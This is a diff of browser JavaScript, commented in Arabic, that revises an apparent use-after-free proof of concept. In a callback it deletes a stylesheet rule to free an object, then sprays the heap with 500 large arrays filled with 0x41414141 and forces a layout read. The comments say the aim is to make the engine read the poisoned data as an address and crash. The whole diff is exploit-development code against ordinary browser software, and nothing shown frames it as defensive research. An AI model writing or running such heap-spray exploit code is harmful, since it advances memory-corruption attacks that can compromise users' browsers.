@@ -21,25 +21,23 @@ window.onload = () => {
             if (this === A) {
                 callbackCount++;
                 
-                // تجربة العداد عند الاستدعاء الأول المباشر لـ setStatus
                 if (callbackCount === 1) { 
-                    
-                    // تدمير الكائن المستهدف من الذاكرة
+                    // 1. تدمير الكائن
                     document.getElementById('s').sheet.deleteRule(0);
                     
-                    // استخدام setTimeout بفترة 0 لفصل التنفيذ ومنع التجميد الصامت
-                    setTimeout(() => {
-                        let holder = [];
-                        for (let i = 0; i < 20; i++) {
-                            holder.push(new ArrayBuffer(0x400)); 
-                        }
-                        
-                        // قراءة المؤشر بعد إعادة التهيئة
-                        document.body.offsetTop;
-                        
-                        // تحويل الشاشة للأخضر لإثبات الاستقرار بعد الـ Use-After-Free
-                        document.body.style.background = "green";
-                    }, 0);
+                    // 2. محاولة ملء الفراغ فوراً ببيانات ضخمة ومكثفة لإحداث تعارض عالي
+                    let poison = [];
+                    for (let i = 0; i < 500; i++) {
+                        // استخدام أحجام مختلفة لمحاولة إغراق قطاع الذاكرة المحرر
+                        poison.push(new Uint32Array(0x1000).fill(0x41414141)); 
+                    }
+                    
+                    // 3. إجبار المحرك على القراءة الفورية
+                    document.body.offsetTop;
+                    
+                    // إذا كان الكود أعمى ولا يرى الثغرة، ستصبح الشاشة خضراء.
+                    // إذا كانت الثغرة شغالّة 100%، الـ offsetTop سيحاول قراءة البيانات المسمومة (0x41414141) كعنوان وينهار فوراً.
+                    document.body.style.background = "green";
                 }
             }
             return undefined;
